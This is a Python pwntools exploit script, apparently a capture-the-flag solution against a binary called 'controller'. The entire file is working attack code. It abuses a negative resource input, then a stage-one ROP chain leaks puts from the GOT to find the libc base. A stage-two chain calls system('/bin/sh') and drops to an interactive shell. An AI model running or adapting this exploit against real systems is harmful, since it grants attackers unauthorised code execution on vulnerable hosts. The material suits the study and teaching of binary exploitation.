from pwn import *

#Settings
filename = "controller"
remote = False
junk = b"A"*32

def send(payload):
    r.sendlineafter(" the amount of 2 different types of recources:", "-198 1 3")
    r.recvuntil("Do you want to report the problem?")
    r.sendlineafter(">", payload)
    r.recvuntil(" Problem ingored\n")

def start(elf, ssh=False):
    if remote:
        if ssh:
            s = ssh(host="", user="", password="")
            return [s.process(), ELF("libc.so.6")]
        else:
            return [remote("", 1337), ELF("libc.so.6")]
    else:
        return [elf.process(), ELF('/lib/x86_64-linux-gnu/libc.so.6')]


#Start the processes.
elf = ELF(filename)
r = start(elf)[0]
libc = start(elf)[1]
rop = ROP(elf)

#Base gadgets
ret_addr = (rop.find_gadget(['ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # pop rdi; ret
log.info(f"pop rdi @ {hex(pop_rdi)}")
log.info(f"return address @ {hex(ret_addr)}")


#STAGE 1.
log.success("Beginning STAGE 1.")
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
plt_main = elf.symbols["main"]
log.info(f"got_puts @ {hex(got_puts)}")
log.info(f"plt_puts @ {hex(plt_puts)}")
log.info(f"plt_main @ {hex(plt_main)}")

payload = junk
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(plt_main)

send(payload)

leak = u64(r.recvline()[:8].strip().ljust(8, b"\x00"))
log.info(f"leaked puts address @ {hex(leak)}")
libc.address = leak - libc.symbols["puts"]
log.info(f"LIBC Base address @ {hex(libc.address)}")

#STAGE 2.
print()
log.success("Beginning STAGE 2.")
bin_sh = next(libc.search(b"/bin/sh")) # Libc /bin/sh address
system = libc.symbols["system"] # libc system address
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"system @ {hex(system)}")

#Crafting the final payload
payload = junk
#payload += p64(ret_addr)
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

#Sending the payload
log.success("Sending the payload")
send(payload)
r.interactive()
